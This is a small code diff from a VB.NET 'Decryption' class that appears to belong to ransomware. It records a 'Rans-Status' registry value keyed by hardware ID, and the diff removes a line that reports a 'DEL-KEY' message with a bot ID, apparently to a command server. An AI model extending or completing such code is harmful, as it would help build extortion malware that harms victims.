@@ -38,7 +38,6 @@ Public Class Decryption
             num = Nothing
             P1 = Nothing
             Threading.Thread.CurrentThread.Sleep(1000)
-            Main.Send("DEL-KEY" + SPL + Main.BOT)
 
             My.Computer.Registry.SetValue("HKEY_CURRENT_USER\Software\" + Main.HWID, "Rans-Status", "Decrypted")
 
